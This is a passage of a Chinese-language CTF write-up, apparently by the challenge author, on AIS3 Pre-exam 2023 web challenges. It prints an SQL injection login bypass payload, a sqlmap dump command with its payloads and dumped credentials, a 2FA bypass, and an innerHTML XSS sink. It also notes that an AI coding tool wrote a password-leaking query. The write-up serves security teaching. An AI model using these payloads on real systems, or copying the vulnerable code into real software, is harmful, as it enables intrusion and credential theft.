+<p>這題也有人不透過 DES Key Transformation 的特性來解：既然存 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 個 middle 會出錯，那就只存隨機挑的一部分就好了，存到電腦可負荷的量就好，這樣也有高機率解的出來。</p>
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Login-Panel"><a href="#Login-Panel" class="headerlink" title="Login Panel"></a>Login Panel</h4><p><a class="link" target="_blank" rel="noopener" href="https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/web/login-panel">題目 source code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<ul>
+<li>解題人數<ul>
+<li>MyFirstCTF: 24 / 111 (score &gt;= 100)</li>
+<li>Pre-exam: 139 / 256 (score &gt;= 100)</li>
+</ul>
+</li>
+</ul>
+<p>這題是 web 的 welcome 題，是來送大家分數的。進來會看到 CTF 很常出現的 login panel。</p>
+<iframe frameBorder="0" style="overflow: visible; width: 100%; height: 30rem; " scrolling="no" srcdoc="<!DOCTYPE html> <html lang=&quot;en&quot;> <head> <meta charset=&quot;UTF-8&quot;> <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;> <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;><title>Login</title> <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;> <script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script> <script type=&quot;text/javascript&quot;> function onSubmit(token) { login.submit(); } (function(c,l,a,r,i,t,y){ c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)}; t=l.createElement(r);t.async=1;t.src=&quot;https://www.clarity.ms/tag/&quot;+i; y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y); })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;); </script> </head> <body> <div class=&quot;container border rounded mt-5&quot; style=&quot;width: 25rem; max-width: 100%;&quot;> <form class=&quot;p-4&quot; id=&quot;login&quot;> <h2>Login</h2> <div class=&quot;form-text&quot;>You can login as guest/guest.</div> <div class=&quot;form-outline mt-3&quot;> <label for=&quot;username&quot; class=&quot;form-label&quot;>Username:</label> <input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; class=&quot;form-control&quot;> </div> <div class=&quot;form-outline mt-3&quot;> <label for=&quot;password&quot; class=&quot;form-label&quot;>Password:</label> <input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot;> </div> <input type=&quot;submit&quot; value=&quot;Submit&quot; class=&quot;btn btn-primary mt-3 g-recaptcha&quot; data-sitekey=&quot;6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI&quot; data-callback=&quot;onSubmit&quot;> </form> </div> </body> </html>"></iframe>
+
+<p>這題比賽時有提供 <a class="link" target="_blank" rel="noopener" href="https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/web/login-panel">source code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 所以大家可以不用通靈題目有什麼洞，直接來看看<a class="link" target="_blank" rel="noopener" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/login-panel/web/app.js#L56-L72">登入部分的 code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
+<p>看到下方的第 3 行，使用者提供的 <code>username</code> 跟 <code>password</code> 直接被放進 SQL 的語句內，所以有明顯的 SQL injection 漏洞。</p>
+<p>需要注意的一點是第 6 行還會檢查使用者提供的 <code>username</code> 要跟 SQL query 出來的 <code>row.username</code> 相等才能成功登入。知道這些就可以來想辦法登入了。</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">'/login'</span>, recaptcha.<span class="property">middleware</span>.<span class="property">verify</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">const</span> { username, password } = req.<span class="property">body</span></span><br><span class="line">    db.<span class="title function_">get</span>(<span class="string">`SELECT * FROM Users WHERE username = '<span class="subst">${username}</span>' AND password = '<span class="subst">${password}</span>'`</span>, <span class="title function_">async</span> (err, row) =&gt; {</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`https://www.youtube.com/watch?v=dQw4w9WgXcQ`</span>)</span><br><span class="line">        <span class="keyword">if</span> (!row) <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/login?msg=invalid_credentials`</span>)</span><br><span class="line">        <span class="keyword">if</span> (row.<span class="property">username</span> !== username) {</span><br><span class="line">            <span class="comment">// special case</span></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`https://www.youtube.com/watch?v=E6jbBLrxY1U`</span>)</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">recaptcha</span>.<span class="property">error</span>) {</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">recaptcha</span>.<span class="property">error</span>)</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/login?msg=invalid_captcha`</span>)</span><br><span class="line">        }</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">username</span> = username</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">'/2fa'</span>)</span><br><span class="line">    })</span><br><span class="line">})</span><br></pre></td></tr></table></figure></div>
+
+<p>我們只需要將 <code>username</code> 設成 <code>admin</code>，<code>password</code> 設成 <code>' or ''='</code> SQL 語句就會變成下面這樣。所有在 <code>Users</code> 裡面的 row 都符合這個條件，加上使用的是 <code>db.get</code> 所以會回傳符合條件的第一個欄位，也就是 <code>admin</code> 的那個 row。</p>
+<p>這個 payload 也可以通過第 6 行的檢查，所以就能成功登進去 <code>admin</code> 的帳戶了。有人一直繞不過第 6 行的檢查還被做成<a href="/ais3-pre-exam-2023-write-up/login-panel-meme.webp">梗圖</a>。</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">'admin'</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">''</span> <span class="keyword">or</span> <span class="string">''</span><span class="operator">=</span><span class="string">''</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>進去後會看到 2FA 頁面，我們先來檢查他的 2FA 功能有沒有洞，因為 source 裡面有說 flag 在 <code>/dashboard</code> 裡面，直接來看 <a class="link" target="_blank" rel="noopener" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/login-panel/web/app.js#L98-L106">dashboard 的 code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
+<iframe frameBorder="0" style="overflow: visible; width: 100%; height: 37rem; " scrolling="no" srcdoc="<!DOCTYPE html> <html lang=&quot;en&quot;>  <head>     <meta charset=&quot;UTF-8&quot;>     <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;>     <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;>     <meta name=&quot;robots&quot; content=&quot;noindex,nofollow&quot;>     <title>2FA</title>     <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;>     <script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script>     <script type=&quot;text/javascript&quot;>         (function (c, l, a, r, i, t, y) {             c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };             t = l.createElement(r); t.async = 1; t.src = &quot;https://www.clarity.ms/tag/&quot; + i;             y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);         })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;);     </script> </head>  <body>     <div class=&quot;container border rounded mt-5&quot; style=&quot;width: 25rem; max-width: 100%&quot;>         <form class=&quot;p-4&quot; id=&quot;login&quot;>             <h2 class=&quot;mb-3&quot;>2FA</h2>             <div class=&quot;alert alert-info&quot; role=&quot;alert&quot;>2FA code was sent to your email. Please enter it below.</div>             <div class=&quot;alert alert-primary&quot; role=&quot;alert&quot;>If you are a guest, your 2FA code will always be <code>99999999999999</code>.</div>              <div class=&quot;form-outline mt-3&quot;>                 <label for=&quot;code&quot; class=&quot;form-label&quot;>2FA Code</label>                 <input type=&quot;number&quot; id=&quot;code&quot; name=&quot;code&quot; class=&quot;form-control&quot; value=&quot;99999999999999&quot;>             </div>                                       <input type=&quot;submit&quot; value=&quot;Submit&quot; class=&quot;btn btn-primary mt-3 g-recaptcha&quot;>         </form>     </div> </body>  </html>"></iframe>
+
+<p>看到下方 <code>/dashboard</code> 的部分，他根本沒去驗 2FA 認證有沒有通過，只有看 <code>req.session.username</code>，而 <code>req.session.username</code> 在成功登入的時候就已被設成 <code>admin</code> 了，所以登入到 2FA 頁面後直接訪問 <code>/dashboard</code> 就可以看到 flag 了。</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">'/dashboard'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">username</span>) {</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">'dashboard'</span>, {</span><br><span class="line">            <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">username</span>,</span><br><span class="line">            <span class="attr">flag</span>: <span class="variable constant_">FLAG</span></span><br><span class="line">        })</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">'/'</span>)</span><br><span class="line">})</span><br></pre></td></tr></table></figure></div>
+
+<iframe frameBorder="0" style="overflow: visible; width: 100%; height: 30rem; " scrolling="no" srcdoc="<!DOCTYPE html> <html lang=&quot;en&quot;>  <head>     <meta charset=&quot;UTF-8&quot;>     <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;>     <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;>     <meta name=&quot;robots&quot; content=&quot;noindex,nofollow&quot;>     <title>Dashboard</title>     <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;>     <script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script>     <script type=&quot;text/javascript&quot;>         (function (c, l, a, r, i, t, y) {             c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };             t = l.createElement(r); t.async = 1; t.src = &quot;https://www.clarity.ms/tag/&quot; + i;             y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);         })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;);     </script> </head>  <body>     <div class=&quot;container&quot;>         <h2 class=&quot;mt-5&quot;>Dashboard</h2>         <div class=&quot;alert alert-info mt-4 alert-dismissible&quot; role=&quot;alert&quot;>Welcome back admin!</div>                     <div class=&quot;alert alert-primary mt-4&quot; role=&quot;alert&quot;>Here is your flag: <code>AIS3{' UNION SELECT 1, 1, 1, 1 WHERE ({condition})--}</code></div>                  <a class=&quot;btn btn-primary mt-3&quot;>Logout</a>     </div>  </body>  </html>"></iframe>
+
+<p>然後這題雖然有裝 reCAPTCHA 但其實沒有裝好，所以可以直接用 sqlmap 把資料庫直接 dump 出來，只是有些地方要按對才挖的出來。</p>
+<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap http://url/login --data <span class="string">"username=admin*&amp;password=p"</span> --level 5 --risk 3 --dump</span><br></pre></td></tr></table></figure></div>
+
+<p>執行上面這個的時候，會被問到下面這類問題，這邊要按 <code>n</code>，因為有些時候會把 sqlmap 導到 Youtube 造成 sqlmap 會有錯誤的判斷。</p>
+<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">got a 302 redirect to <span class="string">'http://xxx/'</span>. Do you want to follow? [Y/n]</span><br></pre></td></tr></table></figure></div>
+
+<p>把資料庫 dump 出來後就直接拿去正常登入就好了。</p>
+<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Parameter: <span class="comment">#1* ((custom) POST)</span></span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - comment)</span><br><span class="line">    Payload: username=admin%<span class="string">' OR NOT 1853=1853-- aGKT&amp;password=p</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: SQLite &gt; 2.0 OR time-based blind (heavy query)</span></span><br><span class="line"><span class="string">    Payload: username=admin%'</span> OR 7991=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND <span class="string">'wNiy%'</span>=<span class="string">'wNiy&amp;password=p</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">Database: &lt;current&gt;</span></span><br><span class="line"><span class="string">Table: Users</span></span><br><span class="line"><span class="string">[2 entries]</span></span><br><span class="line"><span class="string">+----+----------------+---------------------------------+----------+</span></span><br><span class="line"><span class="string">| id | code           | password                        | username |</span></span><br><span class="line"><span class="string">+----+----------------+---------------------------------+----------+</span></span><br><span class="line"><span class="string">| 1  | 47428350415632 | e1a5654762d385c8                | admin    |</span></span><br><span class="line"><span class="string">| 2  | 99999999999999 | guest                           | guest    |</span></span><br><span class="line"><span class="string">+----+----------------+---------------------------------+----------+</span></span><br></pre></td></tr></table></figure></div>
+
+<p>這題最初是想做成只能用 boolean-based blind 挖資料庫，讓大家繞 reCAPTCHA 才能解的，不過我沒去擋 <code>row.password</code> 所以可以用簡單的方法解出。</p>
+<h4 id="E-portfolio-baby"><a href="#E-portfolio-baby" class="headerlink" title="E-portfolio baby"></a>E-portfolio baby</h4><p><a class="link" target="_blank" rel="noopener" href="https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/web/e-portfolio-baby">題目 source code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<ul>
+<li>解題人數<ul>
+<li>MyFirstCTF: 0 / 111 (score &gt;= 100)</li>
+<li>Pre-exam: 35 / 256 (score &gt;= 100)</li>
+</ul>
+</li>
+</ul>
+<p>題目 註冊 / 登入 後會來到 <code>Edit Portfolio</code> 的頁面，像下面這樣。</p>
+<iframe frameBorder="0" style="overflow: visible; width: 100%; height: 35rem; " srcdoc="<html lang=&quot;en&quot;><head> <title>Edit Portfolio</title> <script async=&quot;&quot; src=&quot;https://www.clarity.ms/s/0.7.8/clarity.js&quot;></script><script async=&quot;&quot; src=&quot;https://www.clarity.ms/tag/gsfl4ftdey&quot;></script> <meta charset=&quot;UTF-8&quot;> <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;> <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;> <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;> <script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script> <!-- Google tag (gtag.js) --> <script async=&quot;&quot; src=&quot;https://www.googletagmanager.com/gtag/js?id=G-2EDF3XCYWP&quot;></script> <script nonce=&quot;&quot;> window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag(&quot;js&quot;, new Date()); gtag(&quot;config&quot;, &quot;G-2EDF3XCYWP&quot;); </script> <script type=&quot;text/javascript&quot; nonce=&quot;&quot;> (function (c, l, a, r, i, t, y) { c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) }; t = l.createElement(r); t.async = 1; t.src = &quot;https://www.clarity.ms/tag/&quot; + i; y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y); })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;); </script> <style> body { background-color: #ffed4a; } </style></head> <body> <div class=&quot;container-sm mt-5&quot;> <h1 class=&quot;mb-3&quot;>Edit Portfolio</h1> <div class=&quot;row mb-5&quot;> <div class=&quot;col-sm-3&quot;> <h3 class=&quot;mb-3 mt-3&quot;>Photo</h3> <img src=&quot;/images/Ching367436.webp&quot; class=&quot;img-fluid&quot; id=&quot;avatar&quot; style=&quot;width: 15rem;&quot;> <div class=&quot;mt-3 mb-3&quot;> <label class=&quot;form-label&quot; for=&quot;avatarFile&quot;>Upload avatar</label> <input type=&quot;file&quot; class=&quot;form-control&quot; id=&quot;avatarFile&quot;> </div> </div> <div class=&quot;col-sm-9&quot;> <h3 class=&quot;mt-3&quot;>About <span id=&quot;username&quot;>Ching367436</span></h3> <textarea name=&quot;&quot; id=&quot;about&quot; class=&quot;form-control&quot; rows=&quot;10&quot;><h5>Hello!</h5>
+I am a <span style=&quot;color: red;&quot;>new</span> user.</textarea> </div> </div> <div class=&quot;container&quot;> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;save&quot;>Save</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;logout&quot;>Logout</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;share&quot;>Share</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;report&quot;>Share your portfolio with admin</button> <div class=&quot;g-recaptcha&quot; data-sitekey=&quot;6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI&quot; data-callback=&quot;onReport&quot; data-size=&quot;invisible&quot;></div></div></body></html>"></iframe>
+
+<p>按下 Share 後可以看到輸入的 portfolio 的 HTML 被 render 出來了。而這個頁面正是按下 Share your portfolio with admin 後，admin 會拜訪的頁面，要透過這個頁面的 XSS 偷走 admin 的密碼。</p>
+<iframe frameBorder="0" style="overflow: visible; width: 100%; height: 35rem; " srcdoc="<html lang=&quot;en&quot;><head> <title>Share</title> <meta charset=&quot;UTF-8&quot;> <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;> <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;> <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;> <script async=&quot;&quot; src=&quot;https://www.clarity.ms/tag/gsfl4ftdey&quot;></script><script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script> <!-- Google tag (gtag.js) --> <script async=&quot;&quot; src=&quot;https://www.googletagmanager.com/gtag/js?id=G-2EDF3XCYWP&quot;></script> <script nonce=&quot;&quot;> window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag(&quot;js&quot;, new Date()); gtag(&quot;config&quot;, &quot;G-2EDF3XCYWP&quot;); </script> <script type=&quot;text/javascript&quot; nonce=&quot;&quot;> (function (c, l, a, r, i, t, y) { c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) }; t = l.createElement(r); t.async = 1; t.src = &quot;https://www.clarity.ms/tag/&quot; + i; y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y); })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;); </script> <style> body { background-color: #ffed4a; } </style></head> <body> <div class=&quot;container mt-5&quot;> <h1 class=&quot;mb-3&quot;>Edit Portfolio</h1> <div class=&quot;row mb-5&quot;> <div class=&quot;col-sm-3&quot;> <h3 class=&quot;mb-3 mt-3&quot;>Photo</h3> <img src=&quot;/images/Ching367436.webp&quot; class=&quot;img-fluid&quot; id=&quot;avatar&quot; style=&quot;width: 15rem;&quot;> </div> <div class=&quot;col-sm-9&quot;> <h3 class=&quot;mb-3 mt-3&quot;>About <span id=&quot;username&quot;>Ching367436</span></h3> <div id=&quot;about&quot;><h5>Hello!</h5> I am a <span style=&quot;color: red;&quot;>new</span> user.</div> </div> </div> </div></body></html>"></iframe>
+
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio-baby/web/src/views/share.eta#L30">source code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 裡，也就是下面的第 7 行用了 <code>innerHTML</code>，而 <code>data.data.about</code> 也是我們可完全控制的，所以表示我們能 XSS。</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"&lt;%= it.nonce %&gt;"</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">`/api/share<span class="subst">${location.search}</span>`</span>)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> {</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (data.<span class="property">success</span>) {</span></span><br><span class="line"><span class="language-javascript">                username.<span class="property">innerHTML</span> = data.<span class="property">data</span>.<span class="property">username</span></span></span><br><span class="line"><span class="language-javascript">                about.<span class="property">innerHTML</span> = data.<span class="property">data</span>.<span class="property">about</span></span></span><br><span class="line"><span class="language-javascript">                avatar.<span class="property">src</span> = data.<span class="property">data</span>.<span class="property">avatar</span></span></span><br><span class="line"><span class="language-javascript">            } <span class="keyword">else</span> {</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(data.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">            }</span></span><br><span class="line"><span class="language-javascript">        })</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>有 XSS 後還需要找到能偷 密碼 的地方，剛好 <a target="_blank" rel="noopener" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio-baby/web/src/app.js#L120-L130"><code>/api/portfolio</code></a> 可以拿到使用者的密碼，因為他用了 <code>SELECT *</code>，這個送密碼到前端是 Copilot 寫的洞，如果我沒注意到這題就會變成超級水題。</p>
